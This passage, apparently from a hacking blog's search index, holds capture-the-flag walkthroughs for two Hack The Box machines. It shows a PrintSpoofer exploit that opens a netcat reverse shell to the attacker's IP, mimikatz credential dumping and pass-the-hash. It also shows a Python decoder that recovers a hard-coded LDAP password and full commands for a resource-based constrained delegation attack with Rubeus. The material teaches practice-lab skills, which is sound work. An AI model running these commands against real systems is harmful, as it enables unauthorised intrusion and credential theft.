behalf.\nUsage Context:\nIn the context of SQL Server or IIS using Windows Authentication, SeImpersonatePrivilege enables these services to perform tasks under the security context of the connected user, ensuring that operations adhere to the principle of least privilege and respect user-specific access controls. Example of Impersonate Privilege Working: How Impersonation Works:\nThe client connects to the service using their credentials (via Windows Authentication). The service, upon needing to access other resources (like file shares), uses the client\u0026rsquo;s identity instead of its own. This is possible because the service account is given a special privilege called \u0026ldquo;Impersonate a client after authentication\u0026rdquo;. Simple Text-Based Diagram of Impersonation Mechanism Working:\n[Client] | | (1) Authenticates using Windows Auth v [Server (SQL/IIS)] | | (2) Needs to access other resources v [Impersonation Process] | | (3) Server adopts the client\u0026#39;s identity v [Other Resources] (e.g., File Shares) Client to Server Authentication: The client authenticates to the server using Windows authentication. Resource Request: The server requires access to additional resources (like files). Impersonation: The server impersonates the client\u0026rsquo;s identity to gain the same permissions the client has. Access Resources: The server, acting as the client, accesses external resources (file shares, etc.). 4. Ownership: I upload the PrintSpoofer exploit binary:\nSource: https://github.com/itm4n/PrintSpoofer I upload my nc.exe binary:\nI run the exploit:\n.\\printspoofer.exe -c \u0026quot;C:\\Users\\Public\\Desktop\\nc.exe 10.10.14.34 8888 -e cmd\u0026quot; Shell Caught!\n5. Persistence: Now that we have access we want ensure we can retain it:\nI transfer mimikatz to the box:\nI try and \u0026amp; dump LSASS \u0026amp; Kerberos tickets but it appears the LSASS process is protected which is standard on more updated systems:\nI dump the LSA (Local System Authorited secrets) secrets:\nI find a Default weak Password for accounts: I also dump the SAM secrets:\nI get the Administrator Hash and Kerberoros information for REMOTEAdministrator I verify the Administrator hash works using netexec:\nAs Win-Rm is running 5985,5986 I verify I can re-login using the Admin hash using a PTH (pass the hash attack)\nWe now have persistence.\nLessons Learned: What did I learn? I learned more about C# and creating a reverse shell via xml. I actually learned more about mimikatz (I just use the tool but I never actually sit and think about what is going on under the hood. I finally did and will expanding my notes \u0026amp; sharing them. What silly mistakes did I make? I spent 10 mins resetting the host as I was using the wrong username, this is why I usually always work from vars, but didn\u0026rsquo;t decided to manually type it in!!! Oh for some reason I used the wrong IP to connect back to myself on, triple check!!! Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/remote-box\/"
    },
    
    "http:\/\/localhost:1313\/tags\/seimpersonateprivilege\/": {
        "title": "SeImpersonatePrivilege",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/seimpersonateprivilege\/"
    },
    
    "http:\/\/localhost:1313\/tags\/umbraco\/": {
        "title": "Umbraco",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/tags\/umbraco\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/support-box\/": {
        "title": "Support HTB Walkthrough",
        "tags": ["Box","HTB","Easy","Windows","LDAP","CSharp","RBCD","kerberos","MachineAccountQuota",],
        "content": "Intelligence Hack The Box Support Walkthrough/Writeup: https://app.hackthebox.com/machines/Support How I use variables \u0026amp; wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: Standard Nmap Scan to get a lay of the land: I always do a basic one just to look for low hanging fruit, this means that whilst my main scan is running I can enumerate the low hanging fruit and look for easy wins. With that out the way I start my main nmap scan. sudo nmap -p- -sV -sC -O --disable-arp-ping -Pn -oA FullTCP -iL scopeList Why I use this specific scan: -p-:\nScans all 65,535 TCP ports on the target(s). -sV:\nPerforms service version detection to determine what service and version is running on each open port. -sC:\nRuns a set of default scripts from Nmap’s script engine (NSE) that perform various checks like vulnerability detection, information gathering, etc. -O:\nAttempts to determine the operating system of the target machine. --disable-arp-ping:\nDisables ARP pinging; useful when ARP requests may not be useful or could be blocked by the network. -Pn:\nNo ping scan: Treats the target hosts as \u0026ldquo;up\u0026rdquo; without sending initial pings, useful for bypassing ping-based defenses. -oA FullTCP:\nSaves the scan results in three formats (.nmap, .xml, and .gnmap) with the filename prefix \u0026ldquo;FullTCP\u0026rdquo;, means I can then pass to other scanners such as aquatone or eyewitness which takes .xml NMAP files as input. -iL scopeList:\nThis is just my target list of hosts. I also map single domain to a bash alias in my ~/.zshrc as it\u0026rsquo;s convient for other tools In Depth Scan Complete: We can see the OS is most likely Windows Server 2022 \u0026amp; that SMB signing is enabled and required. Checking For LDAP Anonymous bind: As LDAP is running, I want to check if Anonymous Bind is enabled as it\u0026rsquo;s an easy win to gather information. If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials. We can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using LDAP to perform these queries is that these are most likely not going to trigger any sort of AV etc as LDAP is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here https://github.com/bloodstiller/ldapchecker _\nI run my script but anonymous bind is not enabled, however we get some valuable information such as the Domain Functionality level. We have the domain functionality level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 rootDomainNamingContext: DC=support,DC=htb The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: Any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere’s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nserverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=support,DC=htb schemaNamingContext: CN=Schema,CN=Configuration,DC=support,DC=htb SMB Enumeration: Connecting Via Null \u0026amp; Guest sessions: I try an null session but it is denied.\nHowever it does allow us to connect using the built-in \u0026ldquo;Guest\u0026rdquo; account, and we can read the support-tools share.\nConnecting to SMB: We can see 3 interesting files in the smb share. npp.8.4.1.portable.x64.zip SysinternalsSuite.zip I suspect this is just a copy of the popular SysInternals suite of tools, but want to verify myself that nothing additional has been added to the .zip UserInfo.exe.zip Th I download all the files: The last file is particular interesting, \u0026ldquo;UserInfo.exe.zip\u0026rdquo; as this does not look like a known binary, so may be made by the support staff themselves. UserInfo.exe Binary Enumeration: Running Strings On it: First of all let\u0026rsquo;s run strings on it to see if we can extract any valuable information: strings UserInfo.exe We can see references to enc(oding) passwords and getting passwords as well as usernames, first name, last name. We can also it tells us what version of the .NET framework is, v4.8 (this is useful for our next step) I am guessing, this is using LDAP to interact with the AD environment, this is only a guess though. Hopefully it should trigger some traffic in Wireshark if we run it. There is not much more information we can glean from strings so let\u0026rsquo;s move on. Running the binary itself: As it\u0026rsquo;s a windows binary we can either run it in windows or use Wine, as I run Arch (btw), as my host OS I am going to run it via Wine in my WM.\nLets check if the binary is 32 or 64 bit: We can see it\u0026rsquo;s 32bit so we need to install 32bit support for wine also. Detour, Lets install Wine on Kali Together: If you haven\u0026rsquo;t installed Wine in Kali before you need to follow the below steps: +Note+: Remember when we ran strings on the binary and we saw it was using v.4.8 of the .NET framework, well we need that information here to ensure we have the correct version running. # This is the what enables 32 bit architecture. sudo dpkg --add-architecture i386 sudo apt update sudo apt install wine # This is what installs the wine 32 bit libraries sudo apt install wine32:i386 winecfg # This is just a nice easier way to work with wine. sudo apt-get install winetricks winetricks dotnet48 # This is not wine based but we will need this to use LDAP (thank me later) sudo apt install winbind Running the Binary \u0026amp; Monitoring Traffic with Wireshark: We can see it takes a couple of args, find, user \u0026amp; enabling verbosity\nI setup Wireshark to monitor traffic and then run the below command:\n\u0026amp; get the error: 0114:err:winediag:ntlm_check_version ntlm_auth was not found After some googling, I find that the dep winbind is required, I install and then run again \u0026amp; I am given ALOT more options. First Real Run:\nI run the program and to make life easier check for all users. I see that I get a lot of traffic, however what is interesting is I am only getting the latter half of the connection as with LDAP there should be a bind request happening, however I am only getting the unbind…which is strange. Typically with the bind request the password, DN and auth types are passed but this is not present here. It could be Wine being unreliable so back to the drawing board. +Note+:\nOne thing that is interesting is that this program does not appear to take a password/creds as an argument \u0026amp; it also appears to have some LDAP strings within it. Which means unless the entire domain is running without the need the need for authentication (i doubt it) then there must be some hard-coded LDAP creds within this program. De-compiling the Binary with ILSpy: As I can\u0026rsquo;t see any traffic generated from the binary, which is odd as it does seem to be using LDAP parameters, I will de-compile the binary to see if there are any hard coded credentials/useful information within it.\nWe will use ILSpy to de-compile. It\u0026rsquo;s a cross platform tool that enables us to de-compile .NET programs.\nhttps://github.com/icsharpcode/AvaloniaILSpy What is ILSpy?: ILSpy is a tool for de-compiling .NET programs, which is a fancy way of saying it can take an already-compiled .NET application (the .exe or .dll files) and reverse-engineer it back into readable source code. It\u0026rsquo;s super handy if you\u0026rsquo;re trying to understand how a particular piece of software works, want to check for security vulnerabilities, or even need to recover your own code that you might have lost. ILSpy doesn\u0026rsquo;t give you the exact original code, but it gives you something close enough that you can follow along. It’s open-source and free, which makes it a go-to for a lot of developers, especially in the .NET community. Whether you\u0026rsquo;re doing research, debugging, or just satisfying your curiosity, ILSpy can be a powerful tool to have in your toolkit. _\nInstall ILSpy: If you haven\u0026rsquo;t got it installed, you can do so here. wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64/Release.zip unzip Linux.x64.Release.zip unzip ILSpy-linux-x64-Release.zip # This is the second archive we must extract Launch ILSpy:\ncd artifacts/linux-x64 sudo ./ILSpy Load our binary \u0026amp; turn on dark mode:\nDiscoveries: I search for ldap and as suspected I find the following information. As well as the domain DN in an LDAP query string \u0026quot;LDAP://support.htb I also see that a variable call password is being passed as well and that the AuthenticationTypes is set to 1 This is an LDAP Bind Request with all the information being passed: The below is taken from https://ldap.com/the-ldap-bind-operation/ An LDAP bind request includes three elements: The LDAP protocol version that the client wants to use. This is an integer value, and version 3 is the most recent version. Some very old clients (or clients written with very old APIs) may still use LDAP version 2, but new applications should always be written to use LDAP version 3. The DN of the user to authenticate. This should be empty for anonymous simple authentication, and is typically empty for SASL authentication because most SASL mechanisms identify the target account in the encoded credentials. It must be non-empty for non-anonymous simple authentication. The credentials for the user to authenticate. For simple authentication, this is the password for the user specified by the bind DN (or an empty string for anonymous simple authentication). For SASL authentication, this is an encoded value that contains the SASL mechanism name and an optional set of encoded SASL credentials. This is important as it would appear that the password, is not being requested for on the CLI as there is no parameter for that which means it must be hard-coded. Finding the password string: I search for enc_password which we saw earlier when we ran strings and get the below result: Finding the function: We can see that the variable is used in the Protected function so I search for that function: So this was completley out of my wheelhouse in terms of experience, I have very rudimentary python programming experience at best \u0026amp; I have no background in C#. But let\u0026rsquo;s break it down so it\u0026rsquo;s easier to understand. There are values: There is a base64 encoded password enc_password = \u0026quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\u0026quot;; A byte array (key) with the value: \u0026quot;armando\u0026quot; A function (think this is technically a method?): There is an array which the password is being passed to \u0026amp; converted from base64: byte[] array = Convert.FromBase64String(enc_password); A second array which has the value of the first array: byte[] array2 = array; A for loop that is manipulating these with this piece of logic: array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu); It then returns array2 using \u0026ldquo;GetString\u0026rdquo; (which I am guessing is a decoded password) return Encoding.Default.GetString(array2) This is on it\u0026rsquo;s surface seems quite simple, we take two values, key \u0026amp; enc_password apply the following logic array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu); \u0026amp; get a password……but how? Decoding the logic: So this took me on a deep dive as I had no idea what was going on \u0026amp; had to decode this function line by line:\nStatic elements: Password: private static string enc_password = \u0026quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\u0026quot;; The base64 encrypted password. Key: private static byte[] key = Encoding.ASCII.GetBytes(\u0026quot;armando\u0026quot;); A byte array created from the string \u0026ldquo;armando\u0026rdquo;, which will be used as the decryption key. Function/Method Explanation: Base64 Decoding: The encrypted password (enc_password) is a Base64 encoded string. byte[] array = Convert.FromBase64String(enc_password); converts this string back into a byte array (array). Decryption Process: (The Magic) The code loops through each byte of the array (array), performing two XOR operations on each byte: The XOR symbol in C# sharp is ^. This part is what took me longest as I did not have any clue about XOR as a concept as it had never come up for me. What is XOR?\nXOR (Exclusive OR) is a bitwise operation that takes two bits and returns 1 (True) if the bits are different, and 0 (False) if they are the same. For example: 1 XOR 0 = 1 (True) 0 XOR 1 = 1 (True) 1 XOR 1 = 0 (False) 0 XOR 0 = 0 (False) Microsoft have a handy explanation:\nhttps://learn.microsoft.com/en-us/dotnet/csharp/language-reference/operators/boolean-logical-operators#logical-exclusive-or-operator- _\nXOR Operation 1 in the function:\narray2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) This operation is the first step in decrypting the data. Details:\nAccess the i-th Byte:\narray[i] refers to the i-th byte of the encrypted byte array (derived from the Base64 decoded password). key[i % key.Length] refers to the corresponding byte from the decryption key. % The (modulus) operator ensures that if i is greater than the length of the key, it wraps around to the beginning of the key to start again. XOR with Key Byte:\nThe encrypted byte in array[i] is XORed with the corresponding byte from the key. This is the first step to reversing the scrambling of the data. This operation undoes the initial encryption that mixed the original data with the key during encryption. By applying the same key in reverse, this step partially restores the original data. Example Using Simple Hex Value:\nThis is just to show how it works, not what is happening here. If array[i] is 0x5A (binary 01011010), and key[i % key.Length] is 0x41 (binary 01000001), Bit Pass (0x5A) Key (0x41) XOR Result (0x1B) True/False Bit 7 (MSB) 0 0 0 False Bit 6 1 1 0 False Bit 5 0 0 0 False Bit 4 1 0 1 True Bit 3 1 0 1 True Bit 2 0 0 0 False Bit 1 1 0 1 True Bit 0 (LSB) 0 1 1 True XOR Operation 2:\n^ 0xDFu This operation completes the decryption by reversing the final layer of encryption. Details:\nHexadecimal XOR:\nAfter the first XOR operation, the result is XORed again with hexidecimal value of 0xDF, which is the binary value 11011111. Final XOR Operation:\nThis is the final step in reversing the scrambling of the data. It undoes the last layer during encryption, restoring the byte to its original, unencrypted value. By XORing with 0xDF, it reverses the effect of the same XOR operation that was applied during encryption. Example (continuing from above):\nBit Position Pass (0x5A) Key (0x41) XOR Result (0x1B) True/False Second XOR Operation Key (0xDF) Final XOR Result (0xC4) True/False Bit 7 (MSB) 0 0 0 False 00011011 1 1 True Bit 6 1 1 0 False 00011011 1 1 True Bit 5 0 0 0 False 00011011 0 0 False Bit 4 1 0 1 True 00011011 1 0 False Bit 3 1 0 1 True 00011011 1 0 False Bit 2 0 0 0 False 00011011 1 1 True Bit 1 1 0 1 True 00011011 1 0 False Bit 0 (LSB) 0 1 1 True 00011011 1 0 False Summary of the Two XOR Operations:\nFirst XOR (with the key): The encrypted byte is XORed with the corresponding byte from the key. This operation \u0026ldquo;removes\u0026rdquo; the encryption that was applied using this key. It reverses the step where each byte of the original password was XORed with the key to produce an intermediate decrypted byte. Second XOR (with 0xDF): The result of the first XOR operation is then XORed with the fixed value 0xDF. This step \u0026ldquo;undoes\u0026rdquo; the final layer of encryption that was applied when the original password was encrypted. The combination of these two XORs returns the byte back to its original (clear text) state before it was encrypted. Conversion to String: After all bytes have been processed, the resulting byte array (array2) is converted back into a string using: return Encoding.Default.GetString(array2);. This string is the original decrypted password. Returning the Password: Finally, the decrypted password string is returned by the getPassword() method. In Simple Terms: The code takes an encrypted password stored as a Base64 string. It converts it into bytes and then decrypts it using a key (\u0026ldquo;armando\u0026rdquo;) and a specific XOR operation. The decrypted result is then converted back into a readable string, which is the original password. Coding a Decoder in python: So we know how the encryption \u0026amp; decryption process works, we now need to code this ourselves. As I have some experience in Python lets use that. import base64 # Importing the base64 module to handle base64 encoding and decoding from itertools import cycle # Importing the cycle function from itertools to cycle through the key # Decoding the base64 encoded string into bytes. encPassword = base64.b64decode(\u0026#34;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\u0026#34;) # Defining the key as a byte string which will be used in the XOR operation for decryption. key = b\u0026#34;armando\u0026#34; # Defining the hexvalue \u0026#34;0xDFu\u0026#34; key as an integer value. For our second round of XOR key2 = 223 decryptedPass = \u0026#39;\u0026#39; for byteEncPass, byteKey in zip(encPassword, cycle(key)): decryptedPass += chr(byteEncPass ^ byteKey ^ key2) # Printing the final decrypted result. print(decryptedPass) Code Breakdown: Imports:\nimport base64: Imports the base64 module for handling base64 encoding and decoding. from itertools import cycle: Imports the `cycle` function from `itertools` to create an infinite iterator that cycles through the key. Decoding Base64 Encoded String:\nencPassword = base64.b64decode(\u0026quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E\u0026quot;): Decodes the base64 encoded string into a byte sequence (`encPassword`). `encPassword` will hold the decoded binary data that needs to be decrypted. Key Definitions:\nkey = b\u0026quot;armando\u0026quot;: Defines the key \u0026ldquo;armando as a byte string which will be used in the first XOR decryption process. key2 = 223: Defines the second key, which is just the decimal representation of the hex value 0xDFu which will be used in the second XOR operation during decryption. Decryption Process:\ndecryptedPass = '':\nInitializes an empty string decryptedPass to store the decrypted result. Looping and Decrypting:\nfor byteEncPass, byteKey in zip(encPassword, cycle(key))::\nLoops through each byte of the encPassword and pairs it with each byte of the key using the zip() function. If the key is shorter than encPassword it will repeat the key indefinately cycle(key): This is necessary as the key armando is shorter than the base64 decoded string. XOR Decryption:\ndecryptedPass += chr(byteEncPass ^ byteKey ^ key2): Decrypts each byte by performing an XOR operation between: byteEncPass (current byte from encPassword), byteKey (corresponding byte from `key`), key2 (second key). Converts the result of the two XOR operation to a character using chr() and appends those to our variable decryptedPass. Output:\nprint(decryptedPass): Prints the final decrypted string (decryptedPass) which is the original password before encoding and encryption. Running the script and get the password: I run my script and it appears to have reversed the encryption \u0026amp; spat out a clear text ldap password! 2. Foothold: Enumerating the Domain using LDAP: As we now have a foothold in the domain we can query it using standard LDAP queries: Dump All Domain Data:\nI initially dump everything I can with the following command: ldapsearch -H ldap://$box -D ldap@support.htb -w '\u0026lt;Password\u0026gt;' -b \u0026quot;dc=support,dc=htb\u0026quot; \u0026quot;*\u0026quot; \u0026gt;\u0026gt; ldapDump.txt I dump all information like this as sometimes it\u0026rsquo;s just good to grab everything all at once in-case we hit a dead end and then need to run some searches on it. Dump All Users whos description field is not blank:\nI also run the following command that will return all users who\u0026rsquo;s description field is not blank. ldapsearch -H ldap://$box -D ldap@support.htb -w '\u0026lt;Password\u0026gt;' -b \u0026quot;dc=support,dc=htb\u0026quot; -s sub \u0026quot;(\u0026amp;(objectClass=user)(description=*))\u0026quot; I like this query as it\u0026rsquo;s an easy way to pull credentials if they are stored in the description field, unfortunately there was nothing there this time. Finding Passwords in User Fields: I Dump all user information:\nI run this query to dump all the user information and sAMAccount name too: ldapsearch -H ldap://$box -D ldap@support.htb -w '\u0026lt;Password\u0026gt;' -b \u0026quot;dc=support,dc=htb\u0026quot; -s sub \u0026quot;(\u0026amp;(objectClass=user)(sAMAccountName=*))\u0026quot; After sifting through it I find this which looks like a password in the information field for the \u0026ldquo;support\u0026rdquo; account: Verify if the password is valid using netex:\nI verify if it is valid using netexec: IT IS!! We have a valid way into the domain! +Note+: Due to this discovery I have now added the below search to my notes so that in future I also check the \u0026ldquo;info\u0026rdquo; field for passwords: ldapsearch -H ldap://$box -D ldap@\u0026lt;domain\u0026gt;.\u0026lt;domain\u0026gt; -w '\u0026lt;Password\u0026gt;' -b \u0026quot;dc=\u0026lt;domain\u0026gt;,dc=\u0026lt;domain\u0026gt;\u0026quot; -s sub \u0026quot;(\u0026amp;(objectClass=user)(info=*))\u0026quot; Connecting with Evil-WinRM: I connect to the domain using evil-winrm as ports 5985/5986 are both open and running. 3. Priv-Esc: Enumerating the domain with bloodhound: I upload SharpHound.exe using Evil-WinRM and begin scanning the domain.\nChecking for nested group memberships:\nWhilst bloodhound is running I check what nested groups the user we control is a part of. (This will show up in bloodhound, however running this early will tell us if we are part of any known high value windows groups and can provide a clear path to domain takeover.)\nCommand: ldapsearch -H ldap://$box -D ldap@support.htb -w '\u0026lt;Password\u0026gt;' -b \u0026quot;dc=support,dc=htb\u0026quot; -s sub \u0026quot;(member:1.2.840.113556.1.4.1941:=CN=support,CN=Users,DC=support,DC=htb)\u0026quot;\nExplanation:\n\u0026quot;(member:1.2.840.113556.1.4.1941:=CN=support,CN=Users,DC=support,DC=htb)\u0026quot;: This filter leverages the LDAP_MATCHING_RULE_IN_CHAIN rule. The OID being (1.2.840.113556.1.4.1941) It searches for members recursively across group memberships. So it checks if the object CN=support,CN=Users,DC=support,DC=htb is a member of any groups, directly or indirectly. Result:\nIt shows that user we control is actually part of a group called \u0026quot;Shared Support Accounts\u0026quot; This is not a standard group in AD, but it\u0026rsquo;s a discovery none the less. GenericAll privileges on the domain controller. In bloodhound we can see our user has the GenericAll privilege over the Domain Controller, due to the fact that they are part of the \u0026ldquo;Shared Support Accounts\u0026rdquo; group.\nIf you are unfamiliar with the GenericAll privilege, it\u0026rsquo;s incredibly powerful and dangerous.\nDisplay Name: GenericAll Common Name: GA/RIGHT_GENERIC_ALL Hex Value: 0x10000000 Interpretation: Allows creating or deleting child objects, deleting a sub-tree, reading and writing properties, examining child objects and the object itself, adding and removing the object from the directory, and reading or writing with an extended right. This is equivalent to the object-specific access rights bits (DE | RC | WD | WO | CC | DC | DT | RP | WP | LC | LO | CR | VW) for AD objects. In simple terms: This is also known as full control. This permission allows the trustee to manipulate the target object however they wish. Attack Options: Users: If we have this privilege over a user we can use a targeted kerberoasting attack \u0026amp; add an SPN to the user, request that ticket and then crack it offline. Groups: We can then add ourselves or other users to the group, this is especially useful if the group grants privileges by virtue of membership. Computers: We can perform a Resource Based Constrained Delegation attack. https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution We add a fake computer to the domain \u0026amp; configure the computer we have GenericAll permissions over to allow our fake computer to act on behalf of it. This enables us to impersonate a high-privileged user on the domain and request a kerberos ticket for that user we can then either crack or use it in a pass the ticket attack. Resource Based Constrained Delegation Crash Course: Resource-based Constrained Delegation (RBCD) is a feature in Windows Active Directory that allows services to impersonate users under specific conditions. It\u0026rsquo;s an advanced way to handle delegation where permissions are more controlled compared to older methods. Key Differences from Basic Constrained Delegation: Basic Constrained Delegation: Allows a service to impersonate any user to another service. Example: If Service A has permission, it can act as any user when accessing Service B. RBCD: Instead of granting Service A permission to impersonate users, you set permissions on the resource (like Service B) itself, determining which services (like Service A) can impersonate users. The resource (Service B) has an attribute called msDS-AllowedToActOnBehalfOfOtherIdentity. This lists services that can impersonate users for this resource. Why It\u0026rsquo;s Important: With RBCD, no domain admin rights are needed to configure it. Anyone with write permissions to a computer account can modify this setting. Permissions like GenericWrite, WriteDacl, WriteProperty, etc., give access to modify the delegation. This contrasts with other delegation methods that require domain admin rights. The attack, Kerberos Resource-based Constrained Delegation - Computer Object Takeover: The attack (High Level): We are going to create a fake computer on the domain. Configure RBCD by setting the msds-allowedtoactonbehalfofotheridentity to allow our computer to act on behalf of the DC. Perform \u0026amp; S4U attack to get a kerberos ticket on behalf of the administrator. Pass the admins ticket to get RCE on the target. Attack Requirements: Requirement 1 - Ensure we can add machines to the domain: To check if our user has the ability to do this we need to check the ms-ds-machineaccountquota attribute. By default it\u0026rsquo;s set to 10 on domains, but I have seen domains where the admins have, rightfully, disabled it. Checking it using netexec: As we can see it\u0026rsquo;s set to 10 this means we can add up-to 10 machines to this domain. So we can perform the attack Satisfied Requirement 2 - A target computer: We know this is the DC of the domain (and we only have 1 target for this so it has to be that) Satisfied Requirement 3 - Admins on the domain: The LDAP query for this is pretty simple: \u0026quot;(\u0026amp;(objectClass=Person)(adminCount=1))\u0026quot; Satisfied Requirement 4 - There must be at least One Domain Controller running Windows Server 2012 or newer in the environment. At the start of the engagement we can see that the level of the domainFunctionaility level is 7. Level 7, requires that the domain environment be running Windows Server 2016 or newer. Satisfied Requirement 5 - The msds-allowedtoactonbehalfofotheridentity must be empty: This attribute allows a service to impersonate or act on behalf of another account (e.g., a user or computer) when accessing network resources. Which is exactly what we need, as our fake computer will act on behalf of the DC. I upload PowerView.ps1 to the host \u0026amp; then run the following command: Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity Check the Value: We can see it\u0026rsquo;s empty, this is good, as it means we can set the value. If this was already set we could not progress unless we controlled that specific account. Requirement 6 - Various Fake Machine Requirements: We actually don\u0026rsquo;t need to worry about these at the moment, these will be generated whilst we perform the attack. The Fake Computer SID The Name of Fake Computer The Fake Computer Password 4. Ownership: Performing the Attack: Great video of the attack here: https://youtu.be/RUbADHcBLKg?si=bro7uomiQtukaIpe\u0026t=563 1. Add the Computer: Create the computer using Impacket:\nimpacket-addcomputer -computer-name 'bloodstiller' -computer-pass 'hackme' -dc-ip $dcip support.htb/support I verify the computer was made using PowerView:\nGet-AdComputer -identity bloodstiller +Note+: be patient, this can hang for a number of seconds! I also grab the SID of the computer as we will need this moving forward: S-1-5-21-1677581083-3380853377-188903654-6101 2. Modify the msds-allowedtoactonbehalfofotheridentity value on the target: Configure RBCD Using Sharpview\nVerity the PrincipalAllowedToDelegateToAccount value is empty:\nGet-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount Add our computer as to the PrincipalAllowedToDelegateToAccount value:\nSet-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount bloodstiller$ +Note+: be patient, this can hang for a number of seconds! Verify the attribute is set:\nGet-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount It should now contain our fake computer name Verify the msds-allowedtoactonbehalfofotheridentity value has changed:\nGet-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity\nWe can see it has but it\u0026rsquo;s just a series of numbers? It\u0026rsquo;s RAW bytes which we need to convert back to the SID to verify it works.\n$TargetComputer = \u0026#34;DC.support.htb\u0026#34; $RawBytes = Get-DomainComputer $TargetComputer -Properties \u0026#39;msds-allowedtoactonbehalfofotheridentity\u0026#39; | select -expand msds-allowedtoactonbehalfofotheridentity $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0 $Descriptor.DiscretionaryAcl As we can see the AceType is set to AcessAllowed AceType: Represents the type of Access Control Entry (ACE) in the Access Control List (ACL). In this case, the value is AccessAllowed, meaning it grants permission to the associated SecurityIdentifier.(SID). And it has the SID from the fake machine we made earlier so therefore it means that the ACE is set to allow our machine to act on behalf of the domain controller DC.SUPPORT.HTB Minor recap:\nWe have created a fake machine on the domain. We have configured our machine to act on behalf of DC.SUPPORT.HTB 3. Craft Kerberos Ticket with Rubeus for local admin on DC01: Retrieve the password hash that was used to create the computer object:\n.\\Rubeus.exe hash /password:hackme /user:bloodstiller$ /domain:support.htb Breakdown: hash: Instructs Rubeus to extract a hash. /password:hackme: Specifies the password for the user (hackme). /user:bloodstiller$: Specifies the username of the account we want the password for (bloodstiller$). +Note+: we have the $ as this is a machine account /domain:support.htb: Specifies the domain (support.htb). We need this so we can craft tickets. Hash = 601EAB3FDFB146C4ECD8F800C987D621 Generate Kerberos tickets for the Administrator by peforming the S4U attack:\n.\\rubeus.exe s4u /user:bloodstiller$ /rc4:601EAB3FDFB146C4ECD8F800C987D621 /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt /nowrap Breakdown: s4u: Service for User functionality, used to request a service ticket for a user. /user:bloodstiller$: Specifies the user (bloodstiller$), (usually a service account). /rc4:601EAB3FDFB146C4ECD8F800C987D621: The RC4-HMAC key (NTLM hash) for the user (bloodstiller$). /impersonateuser:Administrator: Specifies the user to impersonate (Administrator). /msdsspn:cifs/dc.support.htb: Specifies the SPN (Service Principal Name) for the service to request a ticket (CIFS on dc.support.htb). /domain:support.htb: Specifies the domain (support.htb). /ptt: Pass-the-ticket option to inject the resulting ticket into memory for immediate use. /nowrap: Ensures the ticket is not Base64-encoded (used for better formatting). No idea why nowrap is not standard for the output… 4. Root…..right? We should be able to access the necessary resources locally as we have performed a PTT attack but for some reason it doesn\u0026rsquo;t work, (I actually went to the creators page to see why \u0026amp; it doesn\u0026rsquo;t work for him either so I am not crazy) https://0xdf.gitlab.io/2022/12/17/htb-support.html#get-domain-tgt Instead we will need to convert our tickets and access the target it a different wat. 5. Convert our tickets for use on Linux: For all intents \u0026amp; purposes we now have everything we need to access the domain, however we need to perform some conversions before we can get RCE on the DC from our linux host, luckily we can do this with the impacket-tool tickerConverter We take the base64 encoded string from rubeus and put into a file called b64.ticket:\nWe then decode that ticket whilst 